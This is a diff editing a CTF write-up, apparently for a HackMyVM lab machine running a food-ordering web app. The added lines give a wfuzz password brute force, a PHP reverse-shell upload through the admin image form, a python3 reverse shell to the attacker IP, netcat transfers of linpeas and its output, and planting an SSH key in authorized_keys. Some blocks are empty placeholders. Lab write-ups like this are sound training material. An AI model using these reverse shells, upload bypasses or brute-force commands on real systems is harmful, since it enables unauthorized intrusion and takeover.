@@ -14,13 +14,16 @@
 
 #### Tools Used
 
-- Nmap
-- Netcat
-- Gobuster
 - Burp Suite
+- Gobuster
+- LINpeas
+- Netcat
 - Nikto
-- ZAP
+- Nmap
+- SearchSploit
 - sqlmap
+- Wfuzz
+- ZAP
 
 #### Machine Writeup
 
@@ -439,27 +442,7 @@ Table: users
 [*] ending @ 11:30:21 /2024-09-26/
 ```
 
-`vim ./admin_hashes.txt`:
-```
-$2y$10$efDvenHYJ5Fu/xxt1ANbXuRx5/TuzNs/s4k6keUiiFvr2ueE0GmrG ←
-$2y$10$DJbGDnA6bkOiS0TW08R5FOPruw0wRW4maShgWK8k6FlEfgNjbXsvm ←
-```
-
-`john --wordlist=/usr/share/wordlists/rockyou.txt ./admin_hashes.txt --format=bcrypt`:
-```
-Using default input encoding: UTF-8
-Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
-Cost 1 (iteration count) is 1024 for all loaded hashes
-Will run 4 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-admin123 (hadmin) ← 
-staff (staff) ←
-2g 0:00:19:18 DONE (2024–03–22 09:49) 0.001726g/s 111.3p/s 189.0c/s 189.0C/s super01..special123  
-Use the " - show" option to display all of the cracked passwords reliably  
-Session completed.
-```
-
-`burpsuite`
+`burpsuite` > `http://192.168.56.127/admin/login.php`
 
 `HTTP Request`:
 ```
@@ -481,7 +464,7 @@ username=hadmin&password=TEST ←
 ```
 `HTTP Response`:
 ```
-HTTP/1.1 200 OK
+HTTP/1.1 200 OK ←
 Server: nginx/1.18.0 (Ubuntu)
 Date: Fri, 04 Oct 2024 18:13:15 GMT
 Content-Type: text/html; charset=UTF-8
@@ -491,10 +474,10 @@ Cache-Control: no-store, no-cache, must-revalidate
 Pragma: no-cache
 Content-Length: 1 ←
 
-3
+3 ←
 ```
 
-`curl "http://192.168.56.127/admin/ajax.php?action=login" -d "username=hadmin&password=TEST" -b "PHPSESSID=eda99enik0danli26lp0i78qut" -v`:
+`curl "http://192.168.56.127/admin/ajax.php?action=login" -d "username=hadmin&password=TEST" -v`:
 ```http
 *   Trying 192.168.56.127:80...
 * Connected to 192.168.56.127 (192.168.56.127) port 80
@@ -502,53 +485,99 @@ Content-Length: 1 ←
 > Host: 192.168.56.127
 > User-Agent: curl/8.8.0
 > Accept: */*
-> Cookie: PHPSESSID=eda99enik0danli26lp0i78qut
 > Content-Length: 29
 > Content-Type: application/x-www-form-urlencoded
 > 
 * upload completely sent off: 29 bytes
-< HTTP/1.1 200 OK
+< HTTP/1.1 200 OK ←
 < Server: nginx/1.18.0 (Ubuntu)
-< Date: Fri, 04 Oct 2024 18:24:03 GMT
+< Date: Mon, 07 Oct 2024 13:50:53 GMT
 < Content-Type: text/html; charset=UTF-8
 < Transfer-Encoding: chunked
 < Connection: keep-alive
+< Set-Cookie: PHPSESSID=hdejukjf5n51ln4dpptu9utj33; path=/
 < Expires: Thu, 19 Nov 1981 08:52:00 GMT
 < Cache-Control: no-store, no-cache, must-revalidate
 < Pragma: no-cache
 < 
 * Connection #0 to host 192.168.56.127 left intact
-3          
+3 ←    
+```
+
+`wfuzz -u "http://192.168.56.127/admin/ajax.php?action=login" -d "username=hadmin&password=FUZZ" -z file,/usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords.txt -c -v -t 30 --hs "3"`:
+```
+
 ```
 
 <🔄 Alternative Step.>
 
-`ffuf -u "http://192.168.56.127/admin/ajax.php?action=login" -w /usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords.txt:PASSWORD -H "Cookie: PHPSESSID=eda99enik0danli26lp0i78qut" -c -ic -t 10 -fs 1129`:
-`ffuf -u "http://192.168.56.127/admin/ajax.php?action=login" -w /usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords.txt:PASSWORD -H "Cookie: PHPSESSID=eda99enik0danli26lp0i78qut" -X POST -d "username=hadmin&password=PASSWORD" -c -ic -t 10 -fr "3"`:
+`vim ./admin_hashes.txt`:
+```
+$2y$10$efDvenHYJ5Fu/xxt1ANbXuRx5/TuzNs/s4k6keUiiFvr2ueE0GmrG ←
+$2y$10$DJbGDnA6bkOiS0TW08R5FOPruw0wRW4maShgWK8k6FlEfgNjbXsvm ←
 ```
 
+`john --wordlist=/usr/share/wordlists/rockyou.txt ./admin_hashes.txt --format=bcrypt`:
 ```
-
-``:
-```
-
-```
-
-``:
-```
-
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+admin123 (hadmin) ← 
+staff (staff) ←
+2g 0:00:19:18 DONE (2024–03–22 09:49) 0.001726g/s 111.3p/s 189.0c/s 189.0C/s super01..special123  
+Use the " - show" option to display all of the cracked passwords reliably  
+Session completed.
 ```
 
 </🔄 Alternative Step.>
 
+`curl -X POST "http://192.168.56.127/admin/ajax.php?action=login" -d "username=hadmin&password=admin123" -v`:
+```
+Note: Unnecessary use of -X or --request, POST is already inferred.
+*   Trying 192.168.56.127:80...
+* Connected to 192.168.56.127 (192.168.56.127) port 80
+> POST /admin/ajax.php?action=login HTTP/1.1
+> Host: 192.168.56.127
+> User-Agent: curl/8.8.0
+> Accept: */*
+> Content-Length: 33
+> Content-Type: application/x-www-form-urlencoded
+> 
+* upload completely sent off: 33 bytes
+< HTTP/1.1 200 OK ←
+< Server: nginx/1.18.0 (Ubuntu)
+< Date: Mon, 07 Oct 2024 13:27:05 GMT
+< Content-Type: text/html; charset=UTF-8
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< Set-Cookie: PHPSESSID=u1j8akv6tn8fa1udv3rsq3hctp; path=/ ←
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< 
+* Connection #0 to host 192.168.56.127 left intact
+1 ←
+```
 
+`nc -lnvp 4444`:
+```        
+listening on [any] 4444 ... ←
+```
 
+`vim ./revsh.php`:
+```php
+<?php
+$ip = '192.168.56.118';
+$port = 4444;
 
+$sock = fsockopen($ip, $port);
+$proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
+?>
+```
 
-
-
-
-`echo '<?php echo "This is a PHP TEST."; ?>' > ./TEST.php`
+`firefox` > `http://192.168.56.127/admin/index.php?page=menu`
 
 `burpsuite`
 
@@ -566,35 +595,16 @@ Content-Length: 827
 Origin: http://192.168.56.127
 Connection: close
 Referer: http://192.168.56.127/admin/index.php?page=menu ←
-Cookie: PHPSESSID=eda99enik0danli26lp0i78qut
+Cookie: PHPSESSID=u1j8akv6tn8fa1udv3rsq3hctp ←
 
------------------------------13173069224039884638424562543
-Content-Disposition: form-data; name="id"
-
-
------------------------------13173069224039884638424562543
-Content-Disposition: form-data; name="name"
-
-TEST
------------------------------13173069224039884638424562543
-Content-Disposition: form-data; name="description"
-
-
------------------------------13173069224039884638424562543
-Content-Disposition: form-data; name="category_id"
-
-3
------------------------------13173069224039884638424562543
-Content-Disposition: form-data; name="price"
+[...]
 
 100
 -----------------------------13173069224039884638424562543
-Content-Disposition: form-data; name="img"; filename="TEST.php" ←
+Content-Disposition: form-data; name="img"; filename="./revsh.php" ←
 Content-Type: application/x-php
 
-<?php echo "This is a PHP TEST."; ?> ←
-
------------------------------13173069224039884638424562543--
+[...]
 ```
 `HTTP Response`:
 ```
@@ -611,31 +621,29 @@ Content-Length: 1
 1 ←
 ```
 
-`firefox`
+`firefox` > `http://192.168.56.127/admin/index.php?page=menu`
 
-`<right-click>` > `Inspect` > `Network` > `Clear` > `Reload` > `Search: TEST`:
+`<Ctrl+Shift+I>` > `Inspect` > `Network` > `Clear` > `Reload` > `Search: TEST`:
 ```
-228 <img src="assets/img/1727425680_TEST.php" class="card-img-top" alt="...">
-```
-
-``:
+228 <img src="assets/img/1727425680_revsh.php" class="card-img-top" alt="..."> ←
 ```
 
-```
-
-``:
-```
+`curl -s "http://192.168.56.127/assets/img/1727425680_revsh.php"`
 
 ```
-
-``:
+connect to [192.168.56.118] from (UNKNOWN) [192.168.56.127] 66309 ←
 ```
 
-```
+![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)
 
-![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
+`whoami`:
+```
+www-data ←
+```
 
 <🔄 Alternative Step.>
+
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 `searchsploit online food ordering`:
 ```
@@ -826,8 +834,6 @@ Enter URL of The Vulnarable Application : http://192.168.56.127/ ←
 [+] Successfully connected to webshell. ←
 ```
 
-</🔄 Alternative Step.>
-
 ![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)
 
 `whoami`:
@@ -837,16 +843,18 @@ www-data ←
 
 ![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
-`nc -lnvp 4444`:
+`nc -lnvp 5555`:
 ```        
-listening on [any] 4444 ... ←
+listening on [any] 5555 ... ←
 ```
 
 <div>
-	<img src="C:\Users\nabla\Documents\Obsidian\vault-default\ctf_penetration_testing\hackmyvm\assets\logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
+	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
 	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
 </div>
+
 [Reverse Shells - Linux](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux)
+
 [**#Python**]
 ```
 #Linux
@@ -862,13 +870,15 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 
 ![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)
 
-`python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("192.168.56.118",4444));[os.dup2(s.fileno(),fd) for fd in(0,1,2)];pty.spawn("/bin/sh")'`
+`python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("192.168.56.118",5555));[os.dup2(s.fileno(),fd) for fd in(0,1,2)];pty.spawn("/bin/sh")'`
 
 ![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 ```
 connect to [192.168.56.118] from (UNKNOWN) [192.168.56.127] 52906 ←
 ```
+
+</🔄 Alternative Step.>
 
 ![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)
 
@@ -904,9 +914,9 @@ total 16
 HMVn03145n4nk4 ←
 ```
 
-`nc -lvnp 5555 > ./linpeas.sh`:
+`nc -lvnp 6666 > ./linpeas.sh`:
 ```
-listening on [any] 5555 ... ←
+listening on [any] 6666 ... ←
 ```
 
 ![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
@@ -935,7 +945,7 @@ total 10060
  368 -rw-rw-r-- 1 kali kali  375176 Sep 23 09:43 socat
 ```
 
-`cat ./linpeas.sh | nc 192.168.56.127 5555 -q 0`
+`cat ./linpeas.sh | nc 192.168.56.127 6666 -q 0`
 
 ![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)
 
@@ -950,14 +960,14 @@ total 10060
 
 ![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
-`nc -lvnp 6666 > ./linpeas_output.txt`:
+`nc -lvnp 7777 > ./linpeas_output.txt`:
 ```
-listening on [any] 6666 ... ←
+listening on [any] 7777 ... ←
 ```
 
 ![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)
 
-`cat ./linpeas_output.txt | nc 192.168.56.118 6666 -q 0`
+`cat ./linpeas_output.txt | nc 192.168.56.118 7777 -q 0`
 
 ![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
@@ -1010,12 +1020,14 @@ connect to [192.168.56.118] from (UNKNOWN) [192.168.56.127] 51218 ←
 ```
 
 <div>
-	<img src="C:\Users\nabla\Documents\Obsidian\vault-default\ctf_penetration_testing\hackmyvm\assets\logo_gtfobins.png" alt="GTFOBins Logo" width="16" height="auto">
+	<img src="./assets/logo_gtfobins.png" alt="GTFOBins Logo" width="16" height="auto">
 	<span style="color: white; font-size: 110%;"><strong>GTFOBins</strong></span>
 </div>
+
 [csh](https://gtfobins.github.io/gtfobins/csh/)
 
 [**#SUID**]
+
 If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.
 This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.
 ```
@@ -1095,14 +1107,14 @@ total 8
 
 ![Victim: aelis](https://img.shields.io/badge/Victim-aelis-64b5f6?logo=linux&logoColor=white)
 
-`nc -lnvp 7777 > ./.ssh/authorized_keys`:
+`nc -lnvp 8888 > ./.ssh/authorized_keys`:
 ```
-Listening on 0.0.0.0 7777 ←
+Listening on 0.0.0.0 8888 ←
 ```
 
 ![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
-`cat ./aelis_rsa.pub | nc 192.168.56.127 7777 -q 0`
+`cat ./aelis_rsa.pub | nc 192.168.56.127 8888 -q 0`
 
 ![Victim: aelis](https://img.shields.io/badge/Victim-aelis-64b5f6?logo=linux&logoColor=white)
 
